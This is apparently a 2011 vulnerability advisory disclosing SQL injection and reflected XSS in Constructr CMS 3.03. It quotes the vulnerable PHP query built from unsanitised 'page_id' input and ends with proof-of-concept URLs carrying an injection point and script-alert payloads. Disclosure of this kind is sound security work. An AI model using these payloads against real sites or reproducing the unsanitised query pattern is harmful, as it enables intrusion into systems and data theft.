@@ -1,0 +1,58 @@
+Constructr CMS 3.03 Miltiple Remote Vulnerabilities (XSS/SQLi)
+
+
+Vendor: phaziz interface design
+Product web page: http://www.constructr-cms.org
+Affected version: 3.03.0
+
+Summary: ConstructrCMS is a new and fresh Content Management
+System build with the Power of PHP and MySQL. The Backend is
+mostly controlled by Ajax for a unique User Experience.
+
+Desc: The CMS suffers from several vulnerabilities (SQL and XSS).
+The sql issue can be triggered when the app tries to parse malicious
+arguments to the 'page_id' in the /xmlOutput/constructrXmlOutput.content.xml.php
+script with user input not validated. The result can be seen in the source
+code of the page itself. The xss issue (GET) is thru 'user' and 'hash' parameter in
+the /backend/login.php script.
+
+-------------------------------------------------------------------
+
+32: $PAGE_ID = $_REQUEST['page_id'];
+...
+40:    $select_content = $conContent -> query("
+41:           SELECT *
+42:           FROM $DB_TABLE_CONSTRUCTR_CONTENT
+43:           WHERE page_id = '$PAGE_ID'
+44:           ORDER BY sort ASC
+45:    ")or die(mysql_error());
+...
+51:      while ($all_content = $conContent -> fetch_array($select_content))
+52:      {
+53:           $id            = $all_content['id'];
+54:           $page_id       = $all_content['page_id'];
+...
+
+-------------------------------------------------------------------
+
+Tested on: Microsoft Windows XP Professional SP3 (EN)
+           Apache 2.2.14 (Win32)
+           PHP 5.3.1
+           MySQL 5.1.41 
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+liquidworm gmail com
+
+
+Advisory ID: ZSL-2011-5001
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2011-5001.php
+
+
+10.03.2011
+
+
+PoC:
+
+[SQL] http://constructr/xmlOutput/constructrXmlOutput.content.xml.php?page_id='[INJECT POINT];--";--
+
+[XSS] http://constructr/backend/login.php?installed=101&no_user_rights=101&login_first_echo=101&already_logged_in=101&login_user_deactivated=101&login_failed=101&login_success=101&nosaltnpepper=101&user=101<script>alert(2)</script>&hash=101<script>alert(2)</script>
